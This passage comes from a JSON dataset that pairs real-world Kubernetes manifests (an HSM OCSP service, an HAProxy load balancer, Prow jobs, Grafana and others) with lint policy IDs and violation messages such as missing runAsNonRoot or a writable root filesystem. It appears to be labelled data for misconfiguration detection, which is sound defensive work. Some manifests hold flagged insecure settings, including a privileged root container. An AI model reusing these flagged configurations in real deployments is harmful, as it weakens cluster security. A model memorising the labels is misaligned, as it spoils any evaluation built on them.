httpGet:\n            path: /readyz\n            port: http\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        startupProbe:\n          httpGet:\n            path: /healthz\n            port: http\n          failureThreshold: 2\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        args:\n        - -config\n        - /app/.config/hsmocsp/config.yaml\n        command:\n        - /app/app-hsmocsp\n        env:\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        volumeMounts:\n        - name: app-hsmocsp-config\n          mountPath: /app/.config/hsmocsp/config.yaml\n          subPath: config.yaml\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n      - name: app-hsmocsp-pcscd\n        image: app-pki\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          privileged: true\n          procMount: Default\n          runAsUser: 0\n        args:\n        - pcscd\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        volumeMounts:\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app-hsmocsp-pcscd\" is not set to runAsNonRoot"
  },
  {
    "id": "8899",
    "manifest_path": "data/manifests/the_stack_sample/sample_3357.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-hsmocsp\n  namespace: default\n  labels:\n    app.kubernetes.io/name: app-hsmocsp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-hsmocsp\n      app.kubernetes.io/name: app-hsmocsp\n  template:\n    metadata:\n      labels:\n        app: app-hsmocsp\n        app.kubernetes.io/name: app-hsmocsp\n      annotations: {}\n    spec:\n      affinity: {}\n      serviceAccountName: app-hsmocsp\n      securityContext:\n        fsGroup: 1000\n      volumes:\n      - name: app-hsmocsp-pcscd-volume\n        hostPath:\n          path: /var/run/pcscd/\n          type: ''\n      - name: app-hsmocsp-config\n        configMap:\n          name: app-hsmocsp-config\n      - name: app-hsmocsp-pki-config\n        configMap:\n          name: app-hsmocsp-pki-config\n      - name: app-hsmocsp-vault-config\n        configMap:\n          name: app-hsmocsp-vault-config\n      - name: app-hsmocsp-softhsm2-config\n        configMap:\n          name: app-hsmocsp-softhsm2-config\n      - name: app-hsmocsp-pki-volume\n        emptyDir: {}\n      - name: app-hsmocsp-softhsm2-token-volume\n        emptyDir: {}\n      containers:\n      - name: app-hsmocsp-pki\n        image: app-pki\n        args:\n        - init\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        env:\n        - name: OPENSSL_CA_DIR\n          value: /app/.config/pki\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        - name: HSM_SOPIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: sopin\n        - name: K8S_TOKEN_REVIEWER_JWT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: token\n        - name: K8S_CA_CRT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: ca.crt\n        volumeMounts:\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-pki-config\n          mountPath: /app/.config/pki/ca.conf\n          subPath: ca.conf\n        - mountPath: /app/.config/vault/vault-agent-config.hcl\n          name: app-hsmocsp-vault-config\n          subPath: vault-agent-config.hcl\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n      - name: app-hsmocsp\n        image: app-hsmocsp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: http\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        startupProbe:\n          httpGet:\n            path: /healthz\n            port: http\n          failureThreshold: 2\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        args:\n        - -config\n        - /app/.config/hsmocsp/config.yaml\n        command:\n        - /app/app-hsmocsp\n        env:\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        volumeMounts:\n        - name: app-hsmocsp-config\n          mountPath: /app/.config/hsmocsp/config.yaml\n          subPath: config.yaml\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n      - name: app-hsmocsp-pcscd\n        image: app-pki\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          privileged: true\n          procMount: Default\n          runAsUser: 0\n        args:\n        - pcscd\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        volumeMounts:\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app-hsmocsp-pki\" is not set to runAsNonRoot"
  },
  {
    "id": "8900",
    "manifest_path": "data/manifests/the_stack_sample/sample_3359.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: service-loadbalancer\n  namespace: load-balancer\n  labels:\n    app: service-loadbalancer\n    version: v1\nspec:\n  replicas: 2\n  selector:\n    app: service-loadbalancer\n    version: v1\n  template:\n    metadata:\n      labels:\n        app: service-loadbalancer\n        version: v1\n    spec:\n      serviceAccount: lb-sa\n      serviceAccountName: lb-sa\n      containers:\n      - image: gcr.io/${BPG_GCP_PROJECT_ID}/haproxy:0.4-preprod-20190503-1829\n        imagePullPolicy: Always\n        resources: {}\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        name: haproxy\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        - containerPort: 443\n          protocol: TCP\n        - containerPort: 3306\n          hostPort: 3306\n          protocol: TCP\n        - containerPort: 1936\n          protocol: TCP\n        args:\n        - --tcp-services=mysql:3306,nginxsvc:443\n        - --syslog=true\n        - --ssl-cert=/etc/certs/sslterm/star_playground_preprod_ballerina_io.pem\n        - --ssl-ca-cert=/etc/certs/sslterm/DigiCertCA.crt\n        - --reload-interval=5s\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"haproxy\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "8901",
    "manifest_path": "data/manifests/the_stack_sample/sample_3359.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: service-loadbalancer\n  namespace: load-balancer\n  labels:\n    app: service-loadbalancer\n    version: v1\nspec:\n  replicas: 2\n  selector:\n    app: service-loadbalancer\n    version: v1\n  template:\n    metadata:\n      labels:\n        app: service-loadbalancer\n        version: v1\n    spec:\n      serviceAccount: lb-sa\n      serviceAccountName: lb-sa\n      containers:\n      - image: gcr.io/${BPG_GCP_PROJECT_ID}/haproxy:0.4-preprod-20190503-1829\n        imagePullPolicy: Always\n        resources: {}\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        name: haproxy\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        - containerPort: 443\n          protocol: TCP\n        - containerPort: 3306\n          hostPort: 3306\n          protocol: TCP\n        - containerPort: 1936\n          protocol: TCP\n        args:\n        - --tcp-services=mysql:3306,nginxsvc:443\n        - --syslog=true\n        - --ssl-cert=/etc/certs/sslterm/star_playground_preprod_ballerina_io.pem\n        - --ssl-ca-cert=/etc/certs/sslterm/DigiCertCA.crt\n        - --reload-interval=5s\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8902",
    "manifest_path": "data/manifests/the_stack_sample/sample_3359.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: service-loadbalancer\n  namespace: load-balancer\n  labels:\n    app: service-loadbalancer\n    version: v1\nspec:\n  replicas: 2\n  selector:\n    app: service-loadbalancer\n    version: v1\n  template:\n    metadata:\n      labels:\n        app: service-loadbalancer\n        version: v1\n    spec:\n      serviceAccount: lb-sa\n      serviceAccountName: lb-sa\n      containers:\n      - image: gcr.io/${BPG_GCP_PROJECT_ID}/haproxy:0.4-preprod-20190503-1829\n        imagePullPolicy: Always\n        resources: {}\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        name: haproxy\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        - containerPort: 443\n          protocol: TCP\n        - containerPort: 3306\n          hostPort: 3306\n          protocol: TCP\n        - containerPort: 1936\n          protocol: TCP\n        args:\n        - --tcp-services=mysql:3306,nginxsvc:443\n        - --syslog=true\n        - --ssl-cert=/etc/certs/sslterm/star_playground_preprod_ballerina_io.pem\n        - --ssl-ca-cert=/etc/certs/sslterm/DigiCertCA.crt\n        - --reload-interval=5s\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"haproxy\" does not have a read-only root file system"
  },
  {
    "id": "8903",
    "manifest_path": "data/manifests/the_stack_sample/sample_3359.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: service-loadbalancer\n  namespace: load-balancer\n  labels:\n    app: service-loadbalancer\n    version: v1\nspec:\n  replicas: 2\n  selector:\n    app: service-loadbalancer\n    version: v1\n  template:\n    metadata:\n      labels:\n        app: service-loadbalancer\n        version: v1\n    spec:\n      serviceAccount: lb-sa\n      serviceAccountName: lb-sa\n      containers:\n      - image: gcr.io/${BPG_GCP_PROJECT_ID}/haproxy:0.4-preprod-20190503-1829\n        imagePullPolicy: Always\n        resources: {}\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        name: haproxy\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        - containerPort: 443\n          protocol: TCP\n        - containerPort: 3306\n          hostPort: 3306\n          protocol: TCP\n        - containerPort: 1936\n          protocol: TCP\n        args:\n        - --tcp-services=mysql:3306,nginxsvc:443\n        - --syslog=true\n        - --ssl-cert=/etc/certs/sslterm/star_playground_preprod_ballerina_io.pem\n        - --ssl-ca-cert=/etc/certs/sslterm/DigiCertCA.crt\n        - --reload-interval=5s\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lb-sa\" not found"
  },
  {
    "id": "8904",
    "manifest_path": "data/manifests/the_stack_sample/sample_3359.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: service-loadbalancer\n  namespace: load-balancer\n  labels:\n    app: service-loadbalancer\n    version: v1\nspec:\n  replicas: 2\n  selector:\n    app: service-loadbalancer\n    version: v1\n  template:\n    metadata:\n      labels:\n        app: service-loadbalancer\n        version: v1\n    spec:\n      serviceAccount: lb-sa\n      serviceAccountName: lb-sa\n      containers:\n      - image: gcr.io/${BPG_GCP_PROJECT_ID}/haproxy:0.4-preprod-20190503-1829\n        imagePullPolicy: Always\n        resources: {}\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        name: haproxy\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        - containerPort: 443\n          protocol: TCP\n        - containerPort: 3306\n          hostPort: 3306\n          protocol: TCP\n        - containerPort: 1936\n          protocol: TCP\n        args:\n        - --tcp-services=mysql:3306,nginxsvc:443\n        - --syslog=true\n        - --ssl-cert=/etc/certs/sslterm/star_playground_preprod_ballerina_io.pem\n        - --ssl-ca-cert=/etc/certs/sslterm/DigiCertCA.crt\n        - --reload-interval=5s\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"haproxy\" is not set to runAsNonRoot"
  },
  {
    "id": "8905",
    "manifest_path": "data/manifests/the_stack_sample/sample_3359.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: service-loadbalancer\n  namespace: load-balancer\n  labels:\n    app: service-loadbalancer\n    version: v1\nspec:\n  replicas: 2\n  selector:\n    app: service-loadbalancer\n    version: v1\n  template:\n    metadata:\n      labels:\n        app: service-loadbalancer\n        version: v1\n    spec:\n      serviceAccount: lb-sa\n      serviceAccountName: lb-sa\n      containers:\n      - image: gcr.io/${BPG_GCP_PROJECT_ID}/haproxy:0.4-preprod-20190503-1829\n        imagePullPolicy: Always\n        resources: {}\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        name: haproxy\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        - containerPort: 443\n          protocol: TCP\n        - containerPort: 3306\n          hostPort: 3306\n          protocol: TCP\n        - containerPort: 1936\n          protocol: TCP\n        args:\n        - --tcp-services=mysql:3306,nginxsvc:443\n        - --syslog=true\n        - --ssl-cert=/etc/certs/sslterm/star_playground_preprod_ballerina_io.pem\n        - --ssl-ca-cert=/etc/certs/sslterm/DigiCertCA.crt\n        - --reload-interval=5s\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"haproxy\" has cpu request 0"
  },
  {
    "id": "8906",
    "manifest_path": "data/manifests/the_stack_sample/sample_3359.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: service-loadbalancer\n  namespace: load-balancer\n  labels:\n    app: service-loadbalancer\n    version: v1\nspec:\n  replicas: 2\n  selector:\n    app: service-loadbalancer\n    version: v1\n  template:\n    metadata:\n      labels:\n        app: service-loadbalancer\n        version: v1\n    spec:\n      serviceAccount: lb-sa\n      serviceAccountName: lb-sa\n      containers:\n      - image: gcr.io/${BPG_GCP_PROJECT_ID}/haproxy:0.4-preprod-20190503-1829\n        imagePullPolicy: Always\n        resources: {}\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        name: haproxy\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        - containerPort: 443\n          protocol: TCP\n        - containerPort: 3306\n          hostPort: 3306\n          protocol: TCP\n        - containerPort: 1936\n          protocol: TCP\n        args:\n        - --tcp-services=mysql:3306,nginxsvc:443\n        - --syslog=true\n        - --ssl-cert=/etc/certs/sslterm/star_playground_preprod_ballerina_io.pem\n        - --ssl-ca-cert=/etc/certs/sslterm/DigiCertCA.crt\n        - --reload-interval=5s\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"haproxy\" has memory limit 0"
  },
  {
    "id": "8907",
    "manifest_path": "data/manifests/the_stack_sample/sample_3360.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ${NAMESPACE}\n  name: cherrypicker\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20220216-aeeaba2bd2\n        args:\n        - --dry-run=false\n        - --use-prow-assignments=false\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cherrypicker\" does not have a read-only root file system"
  },
  {
    "id": "8908",
    "manifest_path": "data/manifests/the_stack_sample/sample_3360.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ${NAMESPACE}\n  name: cherrypicker\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20220216-aeeaba2bd2\n        args:\n        - --dry-run=false\n        - --use-prow-assignments=false\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cherrypicker\" is not set to runAsNonRoot"
  },
  {
    "id": "8909",
    "manifest_path": "data/manifests/the_stack_sample/sample_3360.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ${NAMESPACE}\n  name: cherrypicker\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20220216-aeeaba2bd2\n        args:\n        - --dry-run=false\n        - --use-prow-assignments=false\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cherrypicker\" has cpu request 0"
  },
  {
    "id": "8910",
    "manifest_path": "data/manifests/the_stack_sample/sample_3360.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ${NAMESPACE}\n  name: cherrypicker\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20220216-aeeaba2bd2\n        args:\n        - --dry-run=false\n        - --use-prow-assignments=false\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cherrypicker\" has memory limit 0"
  },
  {
    "id": "8911",
    "manifest_path": "data/manifests/the_stack_sample/sample_3361.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeder-finals-cromu00078\n  labels:\n    type: cyborg-seeder\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeder-finals-cromu00078\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeder.py finals CROMU_00078 3600\n      6\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cyborg-seeder-finals-cromu00078\" does not have a read-only root file system"
  },
  {
    "id": "8912",
    "manifest_path": "data/manifests/the_stack_sample/sample_3361.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeder-finals-cromu00078\n  labels:\n    type: cyborg-seeder\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeder-finals-cromu00078\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeder.py finals CROMU_00078 3600\n      6\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cyborg-seeder-finals-cromu00078\" is not set to runAsNonRoot"
  },
  {
    "id": "8913",
    "manifest_path": "data/manifests/the_stack_sample/sample_3362.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hiccup\nspec:\n  selector:\n    matchLabels:\n      app: hiccup\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: hiccup\n    spec:\n      containers:\n      - name: theapp\n        image: centos:7\n        command:\n        - sh\n        - -c\n        - for x in {1..20}; do echo doing some good work here in $x ; sleep 1; done;\n          echo bye for now; exit\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"theapp\" does not have a read-only root file system"
  },
  {
    "id": "8914",
    "manifest_path": "data/manifests/the_stack_sample/sample_3362.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hiccup\nspec:\n  selector:\n    matchLabels:\n      app: hiccup\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: hiccup\n    spec:\n      containers:\n      - name: theapp\n        image: centos:7\n        command:\n        - sh\n        - -c\n        - for x in {1..20}; do echo doing some good work here in $x ; sleep 1; done;\n          echo bye for now; exit\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"theapp\" is not set to runAsNonRoot"
  },
  {
    "id": "8915",
    "manifest_path": "data/manifests/the_stack_sample/sample_3362.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hiccup\nspec:\n  selector:\n    matchLabels:\n      app: hiccup\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: hiccup\n    spec:\n      containers:\n      - name: theapp\n        image: centos:7\n        command:\n        - sh\n        - -c\n        - for x in {1..20}; do echo doing some good work here in $x ; sleep 1; done;\n          echo bye for now; exit\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"theapp\" has cpu request 0"
  },
  {
    "id": "8916",
    "manifest_path": "data/manifests/the_stack_sample/sample_3362.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hiccup\nspec:\n  selector:\n    matchLabels:\n      app: hiccup\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: hiccup\n    spec:\n      containers:\n      - name: theapp\n        image: centos:7\n        command:\n        - sh\n        - -c\n        - for x in {1..20}; do echo doing some good work here in $x ; sleep 1; done;\n          echo bye for now; exit\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"theapp\" has memory limit 0"
  },
  {
    "id": "8917",
    "manifest_path": "data/manifests/the_stack_sample/sample_3366.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      name: grafana\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - name: grafana\n        image: grafana/grafana:5.4.3\n        ports:\n        - name: grafana\n          containerPort: 3000\n        volumeMounts:\n        - mountPath: /var/lib/grafana\n          name: grafana-storage\n        - mountPath: /etc/grafana/provisioning/datasources\n          name: grafana-datasources\n          readOnly: false\n      volumes:\n      - name: grafana-storage\n        emptyDir: {}\n      - name: grafana-datasources\n        configMap:\n          defaultMode: 420\n          name: grafana-datasources\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"grafana\" does not have a read-only root file system"
  },
  {
    "id": "8918",
    "manifest_path": "data/manifests/the_stack_sample/sample_3366.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      name: grafana\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - name: grafana\n        image: grafana/grafana:5.4.3\n        ports:\n        - name: grafana\n          containerPort: 3000\n        volumeMounts:\n        - mountPath: /var/lib/grafana\n          name: grafana-storage\n        - mountPath: /etc/grafana/provisioning/datasources\n          name: grafana-datasources\n          readOnly: false\n      volumes:\n      - name: grafana-storage\n        emptyDir: {}\n      - name: grafana-datasources\n        configMap:\n          defaultMode: 420\n          name: grafana-datasources\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"grafana\" is not set to runAsNonRoot"
  },
  {
    "id": "8919",
    "manifest_path": "data/manifests/the_stack_sample/sample_3366.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      name: grafana\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - name: grafana\n        image: grafana/grafana:5.4.3\n        ports:\n        - name: grafana\n          containerPort: 3000\n        volumeMounts:\n        - mountPath: /var/lib/grafana\n          name: grafana-storage\n        - mountPath: /etc/grafana/provisioning/datasources\n          name: grafana-datasources\n          readOnly: false\n      volumes:\n      - name: grafana-storage\n        emptyDir: {}\n      - name: grafana-datasources\n        configMap:\n          defaultMode: 420\n          name: grafana-datasources\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"grafana\" has cpu request 0"
  },
  {
    "id": "8920",
    "manifest_path": "data/manifests/the_stack_sample/sample_3366.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      name: grafana\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - name: grafana\n        image: grafana/grafana:5.4.3\n        ports:\n        - name: grafana\n          containerPort: 3000\n        volumeMounts:\n        - mountPath: /var/lib/grafana\n          name: grafana-storage\n        - mountPath: /etc/grafana/provisioning/datasources\n          name: grafana-datasources\n          readOnly: false\n      volumes:\n      - name: grafana-storage\n        emptyDir: {}\n      - name: grafana-datasources\n        configMap:\n          defaultMode: 420\n          name: grafana-datasources\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"grafana\" has memory limit 0"
  },
  {
    "id": "8921",
    "manifest_path": "data/manifests/the_stack_sample/sample_3367.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: app3\n    env: dev\n  name: dev-app3\nspec:\n  ports:\n  - port: 8666\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    app: app3\n    deployment: hello\n    env: dev\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:app3 deployment:hello env:dev])"
  },
  {
    "id": "8922",
    "manifest_path": "data/manifests/the_stack_sample/sample_3371.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20210218-8412872812\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "8923",
    "manifest_path": "data/manifests/the_stack_sample/sample_3371.yaml",
